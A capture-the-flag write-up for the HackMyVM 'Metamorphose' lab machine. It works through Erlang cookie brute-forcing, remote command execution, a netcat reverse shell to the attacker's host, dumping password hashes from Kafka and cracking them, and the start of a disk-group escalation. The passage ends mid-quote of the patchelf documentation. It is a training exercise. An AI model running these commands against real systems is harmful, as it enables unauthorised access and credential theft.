# CTF Penetration Testing

## HackMyVM

### Metamorphose - Machine

#### Machine Description

- Machine name: [Metamorphose](https://hackmyvm.eu/machines/machine.php?vm=Metamorphose)
- Machine type: Linux VM <img src="https://hackmyvm.eu/img/linux.png" alt="Linux" width="20"/>
- Machine difficulty: 🟥 Hard

<img src="https://hackmyvm.eu/img/vm/metamorphose.png" alt="Metamorphose Machine Logo" width="150"/>

#### Tools Used

- curl
- debugfs
- ffuf
- Gobuster
- erl-matter
- John the Ripper
- LINpeas
- Nmap
- patchelf

#### Machine Writeup

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`ifconfig`:
```
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:d5:98:e8:1c  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
        ether 08:00:27:1e:36:4a  txqueuelen 1000  (Ethernet)
        RX packets 89846  bytes 133670439 (127.4 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10045  bytes 606477 (592.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.118  netmask 255.255.255.0  broadcast 192.168.56.255 ←
        inet6 fe80::a50f:d743:435d:299a  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:9d:2e:ba  txqueuelen 1000  (Ethernet)
        RX packets 9  bytes 4816 (4.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 29  bytes 4577 (4.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8  bytes 480 (480.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8  bytes 480 (480.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`fping -a -g 192.168.56.0/24 2> /dev/null`:
```
192.168.56.100
192.168.56.118
192.168.56.142 ←
```

`nmap -Pn -sSV -p- -T5 192.168.56.142`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-15 19:47 CEST
Nmap scan report for 192.168.56.142
Host is up (0.00066s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0) ←
4369/tcp  open  epmd    Erlang Port Mapper Daemon ←
35327/tcp open  unknown ←
MAC Address: 08:00:27:F8:1B:1F (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 146.66 seconds
```

<div>
	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
</div>

[4369 - Pentesting Erlang Port Mapper Daemon (epmd)](https://book.hacktricks.xyz/network-services-pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd)

[**#Basic Info**]

The **Erlang Port Mapper Daemon (epmd)** serves as a coordinator for distributed Erlang instances. It is responsible for mapping symbolic node names to machine addresses, essentially ensuring that each node name is associated with a specific address. This role of **epmd** is crucial for the seamless interaction and communication between different Erlang nodes across a network.
**Default port**: 4369
```
PORT     STATE SERVICE VERSION
4369/tcp open  epmd    Erlang Port Mapper Daemon
```
This is used by default on RabbitMQ and CouchDB installations.

[**#Enumeration**]

Manual:
```
echo -n -e "\x00\x01\x6e" | nc -vn <IP> 4369

#Via Erlang, Download package from here: https://www.erlang-solutions.com/resources/download.html
dpkg -i esl-erlang_23.0-1~ubuntu~xenial_amd64.deb
apt-get install erlang
erl #Once Erlang is installed this will promp an erlang terminal
1> net_adm:names('<HOST>'). #This will return the listen addresses
```
Automatic:
```
nmap -sV -Pn -n -T4 -p 4369 --script epmd-info <IP>

PORT     STATE SERVICE VERSION
4369/tcp open  epmd    Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|     bigcouch: 11502
|     freeswitch: 8031
|     ecallmgr: 11501
|     kazoo_apps: 11500
|_    kazoo-rabbitmq: 25672
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`echo -n -e "\x00\x01\x6e" | nc -vn 192.168.56.142 4369`:
```
(UNKNOWN) [192.168.56.142] 4369 (epmd) open ←
name network at port 35327 ←
```

`nmap -Pn -sSV -p4369 --script=epmd-info -T5 192.168.56.142`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-15 22:36 CEST
Nmap scan report for 192.168.56.142
Host is up (0.0010s latency).

PORT     STATE SERVICE VERSION
4369/tcp open  epmd    Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369 ←
|   nodes: 
|_    network: 35327 ←
MAC Address: 08:00:27:F8:1B:1F (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.56 seconds
```

<div>
	<img src="./assets/logo_github.png" alt="GitHub Logo" width="16" height="auto">
	<span style="color: white; font-size: 110%;"><strong>GitHub</strong></span>
</div>

[erl-matter](https://github.com/gteissier/erl-matter)

[**#Guessing an Erlang cookie**]

As we show above, knowing the Erlang cookie and having access to Erlang distribution is enough to get remote command execution, under the user running the Erlang process.
The curious has noticed that we set the Erlang cookie by ourself. Recalling that communicating nodes shall share the same cookie, you basically have two solutions:
- generate an Erlang cookie using your favorite PRNG, then copy it to the requiring nodes;
- or let Erlang generate a cookie on the first use, then copy it to the requiring nodes.
The rest will focus on automatically generated Erlang cookies.
**Cookies are predictable**. The cookie is derived from a seed. The seed is computed from quantities obtained via:
- `erlang:monotonic_time()`: it stands for the time in nanoseconds from the start of the Erlang virtual machine to the time of the call
- `erlang:unique_integer()`: it returns an integer which is incremented by something linear to the number of Erlang processors
It appears that both quantities are fairly _predictable_.
So far, Erlang cookie space has reduced from:
- At first glance, 20 capital letters, which gives roughly _26^20 ~ 10^28_ candidates;
- The structure of the PRNG reduces the number of candidates cookie to _2^36 ~ 10^8_;
- The poor entropy of the seed further reduces the number of candidates to now roughly _10^6_.
**Automatically generated Erlang cookies offer poor entropy**

[**#Bruteforcing Erlang cookie**]

When you have found an open suitable port, you can use [bruteforce-erldp](https://github.com/gteissier/erl-matter/blob/master/bruteforce-erldp.c) to sweep a seed interval and perform network exchanges to authenticate.
**In the context of the above hardware setup, using the computed interval uncovers the Erlang cookie in 30 seconds:**
```
$ time ./bruteforce-erldp --threads=16 --seed-start=381410768 --seed-end=386584488 --gap=1000 192.168.1.36 25672
16 workers will start, sweeping through [381410768, 386584488]
each worker will sweep though an interval of size 323358
 6766 seed/s (6767 conn/s)		57.57%
found cookie = UDPQJJNGQLLDNASUKRRN

real	7m41.043s
user	0m31.372s
sys	7m8.548s
```
Bruteforce is not always entitled with success. In particular, Erlang cookies which have not been generated by Erlang will not be guessable. However, Erlang runtime does not put throttling protection, nor lock out mecanism based on attempting source IP, so ... it is worth trying it.

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`cd /opt/erl-matter`

`ls -alps ./`:
```
total 420
  4 drwxrwxr-x  3 kali kali   4096 Oct 15 23:17 ./
  4 drwx------ 39 kali kali   4096 Oct 15 23:17 ../
  4 -rw-rw-r--  1 kali kali   1352 Oct 15 23:17 barrier.c
  4 -rwxrwxr-x  1 kali kali    706 Oct 15 23:17 bin-seeds.py
 16 -rw-rw-r--  1 kali kali  16125 Oct 15 23:17 bruteforce-erldp.c
  4 -rwxrwxr-x  1 kali kali   2658 Oct 15 23:17 bruteforce-erldp.py ←
  4 -rw-rw-r--  1 kali kali   3916 Oct 15 23:17 complete-cookie.c
  4 -rwxrwxr-x  1 kali kali   2191 Oct 15 23:17 complete-cookie.sage
  4 -rw-rw-r--  1 kali kali   2272 Oct 15 23:17 crack-hash.c
  8 -rw-rw-r--  1 kali kali   4339 Oct 15 23:17 crack-prng.c
  4 -rwxrwxr-x  1 kali kali   1081 Oct 15 23:17 dictionary-erldp.py
  8 -rw-rw-r--  1 kali kali   6992 Oct 15 23:17 Docker-experiments.md
  4 -rw-rw-r--  1 kali kali     93 Oct 15 23:17 Dockerfile.erlang
 32 -rw-rw-r--  1 kali kali  30249 Oct 15 23:17 erlang.py
  4 -rw-rw-r--  1 kali kali    924 Oct 15 23:17 erldp.c
  4 -rw-rw-r--  1 kali kali    264 Oct 15 23:17 erldp.h
  4 -rw-rw-r--  1 kali kali   3457 Oct 15 23:17 erldp-info.nse
  8 -rwxrwxr-x  1 kali kali   6222 Oct 15 23:17 erldp-proxy.py
  4 -rwxrwxr-x  1 kali kali   3040 Oct 15 23:17 erldp.py
 72 -rw-rw-r--  1 kali kali  69947 Oct 15 23:17 erldp-warning.png
  4 -rw-rw-r--  1 kali kali    117 Oct 15 23:17 example.dist
  4 drwxrwxr-x  8 kali kali   4096 Oct 15 23:17 .git/
  8 -rw-rw-r--  1 kali kali   7135 Oct 15 23:17 Internet-scan.md
  8 -rw-rw-r--  1 kali kali   7851 Oct 15 23:17 jsmn.c
  4 -rw-rw-r--  1 kali kali   1630 Oct 15 23:17 jsmn.h
  4 -rw-rw-r--  1 kali kali   2171 Oct 15 23:17 leaked-cookies
  4 -rw-rw-r--  1 kali kali   2567 Oct 15 23:17 LICENSE
  4 -rw-rw-r--  1 kali kali    535 Oct 15 23:17 Makefile
 16 -rw-rw-r--  1 kali kali  15874 Oct 15 23:17 README.md
  4 -rwxrwxr-x  1 kali kali   3374 Oct 15 23:17 revert-prng.sage
 44 -rw-rw-r--  1 kali kali  42000 Oct 15 23:17 sample-cookies
104 -rw-rw-r--  1 kali kali 104973 Oct 15 23:17 seed-distribution.png
  8 -rwxrwxr-x  1 kali kali   4752 Oct 15 23:17 shell-erldp.py ←
  4 -rwxrwxr-x  1 kali kali   3562 Oct 15 23:17 sweep-default-cookie.py
```

<❌ Failed Step.>

`vim ./calulate_seed_boundaries.py`:
```python
#!/usr/bin/env python3

import time

# Assume the Erlang node was started 1 hour ago
time_elapsed = 300  # seconds (5 minutes)

# Convert the time to nanoseconds
monotonic_time_ns = time_elapsed * 10**9

# Define the seed interval in seconds (e.g., 3 minutes before and after)
interval_sec = 180  # 3 minutes
interval_ns = interval_sec * 10**9

# Calculate seed-start and seed-end
seed_start = int(monotonic_time_ns - interval_ns)
seed_end = int(monotonic_time_ns + interval_ns)

print(f"seed-start: {seed_start}")
print(f"seed-end: {seed_end}")
```

`chmod u+x ./calculate_seed_boundaries.py`

`./calculate_seed_boundaries.py`:
```
seed-start: 120000000000 ←
seed-end: 480000000000 ←
```

`./bruteforce-erldp.py --interval 120000000000,480000000000,1000 192.168.56.142 35327`:
```
Namespace(interval=[(120000000000, 480000000000, 1000.0)], distribution=None, seed_full_space=False, sim=16, target='192.168.56.142', port=33211)

[...]
```

</❌ Failed Step.>

`./shell-erldp.py 192.168.56.142 35327 "TEST" "whoami"`:
```
wrong cookie, auth unsuccessful ←
```

`vim ./erlang_cookie_fuzzer.sh`:
```bash
#!/bin/bash

for word in $(cat /usr/share/wordlists/rockyou.txt); do
	if ! ./shell-erldp.py 192.168.56.142 35327 "$word" "whoami" 2>&1 | grep --silent "wrong cookie, auth unsuccessful"; then
		echo "[+] cookie:$word"
		break
	fi
done
```

`chmod u+x ./erlang_cookie_fuzzer.sh`

`./erlang_cookie_fuzzer.sh`:
```
[+] cookie:batman ←
```

`./shell-erldp.py 192.168.56.142 35327 "batman" "whoami"`:
```
[*] authenticated onto victim ←

[...]
```

`pwncat-cs -lp 4444`:
```
[13:13:13] Welcome to pwncat 🐈!
bound to 0.0.0.0:4444 ←
```

`./shell-erldp.py 192.168.56.142 35327 "batman" "nc -e /bin/bash 192.168.56.118 4444"`:
```
[*] authenticated onto victim ←
```

```
[13:40:40] received connection from 192.168.56.142:98821 ←
[13:40:41] 192.168.56.142:98821: registered new host w/ db
```

![Victim: melbourne](https://img.shields.io/badge/Victim-melbourne-64b5f6?logo=linux&logoColor=white)

`whoami`:
```
melbourne ←
```

`id`:
```
uid=1000(melbourne) gid=1000(melbourne) groups=1000(melbourne),100(users)
```

`uname -a`:
```
Linux metamorphose.hmv 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64 GNU/Linux
```

`lsb_release -a`:
```
No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 12 (bookworm)
Release:        12
Codename:       bookworm
```

`cd /home/melbourne`

`ls -alps ./`:
```
total 28
4 drwx------ 3 melbourne melbourne 4096 Feb 26  2024 ./
4 drwxr-xr-x 4 root      root      4096 Feb 26  2024 ../
0 lrwxrwxrwx 1 root      root         9 Feb 26  2024 .bash_history -> /dev/null
4 -rw-r--r-- 1 melbourne melbourne  220 Feb 26  2024 .bash_logout
4 -rw-r--r-- 1 melbourne melbourne 3526 Feb 26  2024 .bashrc
4 -rw------- 1 melbourne melbourne    7 Feb 26  2024 .erlang.cookie
4 drwxr-xr-x 3 melbourne melbourne 4096 Mar  2  2024 .local/
4 -rw-r--r-- 1 melbourne melbourne  807 Feb 26  2024 .profile
```

`cat ./.erlang.cookie`:
```
batman
```

`ls -alps /home`:
```
total 276
  4 drwxr-xr-x  4 root      root        4096 Feb 26  2024 ./
264 drwxr-xr-x 18 root      root      266240 May 28 11:22 ../
  4 drwx------  2 coralie   coralie     4096 Feb 26  2024 coralie/ ←
  4 drwx------  3 melbourne melbourne   4096 Feb 26  2024 melbourne/
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`upload /home/kali/tools/linpeas.sh /home/melbourne/linpeas.sh`:
```
/home/melbourne ━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 860.3/860.3 KB • ? • 0:00:00
[09:32:10] uploaded 860.34KiB in 0.74 seconds ←
```

![Victim: melbourne](https://img.shields.io/badge/Victim-melbourne-64b5f6?logo=linux&logoColor=white)

`chmod u+x ./linpeas.sh`

`./linpeas.sh > ./linpeas_output.txt`

`cat -n ./linpeas_output.txt`:
```
[...]

   200                  ╔════════════════════════════════════════════════╗
   201  ════════════════╣ Processes, Crons, Timers, Services and Sockets          
   202                  ╚════════════════════════════════════════════════╝
   203  ╔══════════╣ Cleaned processes
   204  ╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes

[...]

   226  root         507  0.5  5.1 2667860 102776 ?      Ssl  09:00   0:11 ← java -Xmx512M -Xms512M -server -XX:+UseG1GC -XX:MaxGCPauseMillis=20 -XX:InitiatingHeapOccupancyPercent=35 -XX:+ExplicitGCInvokesConcurrent -XX:MaxInlineLevel=15 -Djava.awt.headless=true -Xlog:gc*:file=/opt/kafka/bin/../logs/zookeeper-gc.log:time,tags:filecount=10,filesize=100M -Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false -Dkafka.logs.dir=/opt/kafka/bin/../logs -Dlog4j.configuration=file:/opt/kafka/bin/../config/log4j.properties -cp /opt/kafka/bin/../libs/activation-1.1.1.jar:/opt/kafka/bin/../libs/aopalliance-repackaged-2.6.1.jar:/opt/kafka/bin/../libs/argparse4j-0.7.0.jar:/opt/kafka/bin/../libs/audience-annotations-0.12.0.jar:/opt/kafka/bin/../libs/caffeine-2.9.3.jar:/opt/kafka/bin/../libs/checker-qual-3.19.0.jar:/opt/kafka/bin/../libs/commons-beanutils-1.9.4.jar:/opt/kafka/bin/../libs/commons-cli-1.4.jar:/opt/kafka/bin/../libs/commons-collections-3.2.2.jar:/opt/kafka/bin/../libs/commons-digester-2.1.jar:/opt/kafka/bin/../libs/commons-io-2.11.0.jar:/opt/kafka/bin/../libs/commons-lang3-3.8.1.jar:/opt/kafka/bin/../libs/commons-logging-1.2.jar:/opt/kafka/bin/../libs/commons-validator-1.7.jar:/opt/kafka/bin/../libs/connect-api-3.6.1.jar:/opt/kafka/bin/../libs/connect-basic-auth-extension-3.6.1.jar:/opt/kafka/bin/../libs/connect-json-3.6.1.jar:/opt/kafka/bin/../libs/connect-mirror-3.6.1.jar:/opt/kafka/bin/../libs/connect-mirror-client-3.6.1.jar:/opt/kafka/bin/../libs/connect-runtime-3.6.1.jar:/opt/kafka/bin/../libs/connect-transforms-3.6.1.jar:/opt/kafka/bin/../libs/error_prone_annotations-2.10.0.jar:/opt/kafka/bin/../libs/hk2-api-2.6.1.jar:/opt/kafka/bin/../libs/hk2-locator-2.6.1.jar:/opt/kafka/bin/../libs/hk2-utils-

[...]
```

`ss -tunlp`:
```
Netid          State        Recv-Q          Send-Q                        Local Address:Port                     Peer Address:Port       Process 

tcp            LISTEN       0               50                       [::ffff:127.0.0.1]:9092 ←                               *:*                        

[...]
```

`cd /opt/kafka/bin`

`ls -l ./`:
```
total 176
-rwxrwxr-x 1 root root  1423 Nov 24  2023 connect-distributed.sh
-rwxrwxr-x 1 root root  1396 Nov 24  2023 connect-mirror-maker.sh
-rwxrwxr-x 1 root root   963 Nov 24  2023 connect-plugin-path.sh
-rwxrwxr-x 1 root root  1420 Nov 24  2023 connect-standalone.sh
-rwxrwxr-x 1 root root   861 Nov 24  2023 kafka-acls.sh
-rwxrwxr-x 1 root root   873 Nov 24  2023 kafka-broker-api-versions.sh
-rwxrwxr-x 1 root root   871 Nov 24  2023 kafka-cluster.sh
-rwxrwxr-x 1 root root   864 Nov 24  2023 kafka-configs.sh
-rwxrwxr-x 1 root root   945 Nov 24  2023 kafka-console-consumer.sh ←
-rwxrwxr-x 1 root root   944 Nov 24  2023 kafka-console-producer.sh
-rwxrwxr-x 1 root root   871 Nov 24  2023 kafka-consumer-groups.sh
-rwxrwxr-x 1 root root   959 Nov 24  2023 kafka-consumer-perf-test.sh
-rwxrwxr-x 1 root root   882 Nov 24  2023 kafka-delegation-tokens.sh
-rwxrwxr-x 1 root root   880 Nov 24  2023 kafka-delete-records.sh
-rwxrwxr-x 1 root root   866 Nov 24  2023 kafka-dump-log.sh
-rwxrwxr-x 1 root root   877 Nov 24  2023 kafka-e2e-latency.sh
-rwxrwxr-x 1 root root   874 Nov 24  2023 kafka-features.sh
-rwxrwxr-x 1 root root   865 Nov 24  2023 kafka-get-offsets.sh
-rwxrwxr-x 1 root root   867 Nov 24  2023 kafka-jmx.sh
-rwxrwxr-x 1 root root   870 Nov 24  2023 kafka-leader-election.sh
-rwxrwxr-x 1 root root   874 Nov 24  2023 kafka-log-dirs.sh
-rwxrwxr-x 1 root root   881 Nov 24  2023 kafka-metadata-quorum.sh
-rwxrwxr-x 1 root root   873 Nov 24  2023 kafka-metadata-shell.sh
-rwxrwxr-x 1 root root   862 Nov 24  2023 kafka-mirror-maker.sh
-rwxrwxr-x 1 root root   959 Nov 24  2023 kafka-producer-perf-test.sh
-rwxrwxr-x 1 root root   874 Nov 24  2023 kafka-reassign-partitions.sh
-rwxrwxr-x 1 root root   885 Nov 24  2023 kafka-replica-verification.sh
-rwxrwxr-x 1 root root 10884 Nov 24  2023 kafka-run-class.sh
-rwxrwxr-x 1 root root  1376 Nov 24  2023 kafka-server-start.sh
-rwxrwxr-x 1 root root  1361 Nov 24  2023 kafka-server-stop.sh
-rwxrwxr-x 1 root root   860 Nov 24  2023 kafka-storage.sh
-rwxrwxr-x 1 root root   956 Nov 24  2023 kafka-streams-application-reset.sh
-rwxrwxr-x 1 root root   863 Nov 24  2023 kafka-topics.sh ←
-rwxrwxr-x 1 root root   879 Nov 24  2023 kafka-transactions.sh
-rwxrwxr-x 1 root root   958 Nov 24  2023 kafka-verifiable-consumer.sh
-rwxrwxr-x 1 root root   958 Nov 24  2023 kafka-verifiable-producer.sh
-rwxrwxr-x 1 root root  1714 Nov 24  2023 trogdor.sh
drwxrwxr-x 2 root root  4096 Nov 24  2023 windows
-rwxrwxr-x 1 root root   867 Nov 24  2023 zookeeper-security-migration.sh
-rwxrwxr-x 1 root root  1393 Nov 24  2023 zookeeper-server-start.sh
-rwxrwxr-x 1 root root  1366 Nov 24  2023 zookeeper-server-stop.sh
-rwxrwxr-x 1 root root  1019 Nov 24  2023 zookeeper-shell.sh
```

`./kafka-topics.sh --list --bootstrap-server localhost:9092`:
```
__consumer_offsets
internal_logs
user_feedback
users.properties ←
```

`./kafka-console-consumer.sh --bootstrap-server localhost:9092 --topic users.properties --from-beginning`:
```
{"username": "root", "password": "e2f7a3617512ed81aa68c7be9c435609cfb513b021ce07ee9d2759f08f4d9054", "email": "root@metamorphose.hmv", "role": "admin"}

[...]

{"username": "melbourne", "password": "a08aa555a5e5b7a73125cf367176ce446eb1d0c07a068077ab4f740a8fded545", "email": "melbourne@metamorphose.hmv", "role": "admin"}

[...]

{"username": "coralie", "password": "9bf4bc753cfb7e1abafb74ec6e3e22e7d47622d2f39a2652b405d34fd50f023e", "email": "coralie@metamorphose.hmv", "role": "admin"} ←

[...]
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`hash-identifier`:
```
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 9bf4bc753cfb7e1abafb74ec6e3e22e7d47622d2f39a2652b405d34fd50f023e

Possible Hashs:
[+] SHA-256 ←
[+] Haval-256

Least Possible Hashs:
[+] GOST R 34.11-94
[+] RipeMD-256
[+] SNEFRU-256
[+] SHA-256(HMAC)
[+] Haval-256(HMAC)
[+] RipeMD-256(HMAC)
[+] SNEFRU-256(HMAC)
[+] SHA-256(md5($pass))
[+] SHA-256(sha1($pass))
--------------------------------------------------
```

`vim ./coralie_hash.txt`:
```
9bf4bc753cfb7e1abafb74ec6e3e22e7d47622d2f39a2652b405d34fd50f023e
```

`john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt ./coralie_hash.txt`:
```
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 128/128 SSE2 4x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
my2monkeys       (?) ←
1g 0:00:00:00 DONE (2024-10-16 10:38) 6.250g/s 2662Kp/s 2662Kc/s 2662KC/s remmer..colts8
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed.
```

`ssh coralie@192.168.56.142`:
```
coralie@192.168.56.142's password: 
Linux metamorphose.hmv 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue May 28 11:18:43 2024
```

![Victim: coralie](https://img.shields.io/badge/Victim-coralie-64b5f6?logo=linux&logoColor=white)

`whoami`:
```
coralie ←
```

`id`:
```
uid=1001(coralie) gid=1001(coralie) groups=1001(coralie),6(disk)
```

`cd /home/coralie`

`ls -alps ./`:
```
total 24
4 drwx------ 2 coralie coralie 4096 Feb 26  2024 ./
4 drwxr-xr-x 4 root    root    4096 Feb 26  2024 ../
0 lrwxrwxrwx 1 root    root       9 Feb 26  2024 .bash_history -> /dev/null
4 -rw-r--r-- 1 coralie coralie  220 Feb 26  2024 .bash_logout
4 -rw-r--r-- 1 coralie coralie 3526 Feb 26  2024 .bashrc
4 -rw-r--r-- 1 coralie coralie  807 Feb 26  2024 .profile
4 -rwx------ 1 coralie coralie   33 Feb 26  2024 user.txt ←
```

`cat ./user.txt`:
```
aab17*************************** ←
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`scp /home/kali/tools/linpeas.sh coralie@192.168.56.142:/home/coralie/linpeas.sh`:
```
coralie@192.168.56.142's password: 
linpeas.sh                                   100%  840KB  12.3MB/s   00:00 ←
```

![Victim: coralie](https://img.shields.io/badge/Victim-coralie-64b5f6?logo=linux&logoColor=white)

`chmod u+x ./linpeas.sh`

`./linpeas.sh > ./linpeas_output.txt`

`cat -n ./linpeas_output.txt`:
```
[...]

   482                                 ╔═══════════════════╗
   483  ═══════════════════════════════╣ Users Information 
   484                                 ╚═══════════════════╝
   485  ╔══════════╣ My user
   486  ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users
   487  uid=1001(coralie) gid=1001(coralie) groups=1001(coralie),6(disk) ←

[...]
```

`df -h`:
```
Filesystem      Size  Used Avail Use% Mounted on
udev            962M     0  962M   0% /dev
tmpfs           197M  552K  197M   1% /run
/dev/sda1        29G  4.4G   23G  17% / ←
tmpfs           984M     0  984M   0% /dev/shm
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           197M     0  197M   0% /run/user/1001
```

`lsblk`:
```
NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINTS
sda      8:0    0   30G  0 disk 
├─sda1   8:1    0   29G  0 part / ←
├─sda2   8:2    0    1K  0 part 
└─sda5   8:5    0  975M  0 part [SWAP]
sr0     11:0    1 1024M  0 rom  
```

`which debugfs`:
```
```

`find / -iname *debugfs* 2> /dev/null`:
```
/usr/lib/modules/6.1.0-18-amd64/kernel/net/l2tp/l2tp_debugfs.ko
/usr/lib/modules/6.1.0-18-amd64/kernel/drivers/platform/chrome/cros_ec_debugfs.ko
/usr/lib/modules/6.1.0-21-amd64/kernel/net/l2tp/l2tp_debugfs.ko
/usr/lib/modules/6.1.0-21-amd64/kernel/drivers/platform/chrome/cros_ec_debugfs.ko
/usr/share/man/fr/man8/debugfs.8.gz
/usr/share/man/fr/man8/debugfs.reiser4.8.gz
/usr/share/man/fr/man8/debugfs.reiserfs.8.gz
/usr/share/man/man8/debugfs.8.gz
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`which debugfs`:
```
/usr/sbin/debugfs
```

`file /usr/sbin/debugfs`:
```
/usr/sbin/debugfs: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d3ce3fff8611a567435d85bc065d0fc196261fe3, for GNU/Linux 3.2.0, stripped
```

`python3 -m http.server 80 -d /usr/sbin/`:
```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... ←
```

![Victim: coralie](https://img.shields.io/badge/Victim-coralie-64b5f6?logo=linux&logoColor=white)

`wget http://192.168.56.118/debugfs`:
```
--2024-10-16 14:09:40--  http://192.168.56.118/debugfs
Connecting to 192.168.56.118:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 251728 (246K) [application/octet-stream]
Saving to: ‘debugfs’

debugfs                                         100%[====================================================================================================>] 245.83K  --.-KB/s    in 0.006s  

2024-10-16 14:09:40 (41.9 MB/s) - ‘debugfs’ saved [251728/251728] ←
```

`chmod u+x ./debugfs`

`./debugfs`:
```
./debugfs: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.38' not found (required by ./debugfs) ←
```

`rm ./debugfs`

<div>
	<img src="./assets/logo_github.png" alt="GitHub Logo" width="16" height="auto">
	<span style="color: white; font-size: 110%;"><strong>GitHub</strong></span>
</div>

[patchelf](https://github.com/NixOS/patchelf)

PatchELF is a simple utility for modifying existing ELF executables and libraries. In particular, it can do the following:
- Change the dynamic loader ("ELF interpreter") of executables:
    ```shell
    $ patchelf --set-interpreter /lib/my-ld-linux.so.2 my-program
    ```
- Change the `RPATH` of executables and libraries:
```shell
$ patchelf --set-rpath /opt/my-libs/lib:/other-libs my-program
```
- Shrink the `RPATH` of executables and libraries:
```shell
$ patchelf --shrink-rpath my-program
```
This removes from the `RPATH` all directories that do not contain a library referenced by `DT_NEEDED` fields of the executable or library. For instance, if an executable references one library `libfoo.so`, has an RPATH `/lib:/usr/lib:/foo/lib`, and `libfoo.so` can only be found in `/foo/lib`, then the new `RPATH` will be `/foo/lib`.
In addition, the `--allowed-rpath-prefixes` option can be used for further rpath tuning. For instance, if an executable has an `RPATH` `/tmp/build-foo/.libs:/foo/lib`, it is probably desirable to keep the `/foo/lib` reference instead of the `/tmp` entry. To accomplish that, use:
```shell
